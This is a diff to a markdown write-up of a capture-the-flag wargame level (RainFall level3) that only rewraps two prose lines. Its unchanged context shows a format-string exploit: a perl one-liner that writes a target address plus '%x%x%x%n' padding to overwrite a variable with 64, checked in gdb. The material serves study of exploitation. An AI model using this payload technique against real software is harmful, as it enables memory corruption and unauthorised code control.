@@ -77,7 +77,8 @@ We can now use the `%n` conversion which prints the number of characters written
 
 To do so, we need to know how long our string is, then add extra characters to reach 64 bytes before the `%n`.
 
-Let's format the string with the address `0x804988c` and the conversions needed. We use gdb to see what value is written at this address.
+Let's format the string with the address `0x804988c` and the conversions needed. We use gdb to see what value is written
+at this address.
 
 ```console
 level3@RainFall:~$ perl -e 'print "\x8c\x98\x04\x08%x%x%x%n"' > /tmp/level3
@@ -90,7 +91,8 @@ Breakpoint 1, 0x080484df in v ()
 gdb-peda$ x/s $eax
 0x17:	 <Address 0x17 out of bounds>
 ```
-The exploit has worked, the value written is 0x17, or 23 in decimal. Since we want to write 64, we'll add 41 extra characters to our string.
+The exploit has worked, the value written is 0x17, or 23 in decimal. Since we want to write 64, we'll add 41 extra
+characters to our string.
 
 ```console
 level3@RainFall:~$ perl -e 'print "\x8c\x98\x04\x08AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%x%x%x%n"' > /tmp/level3
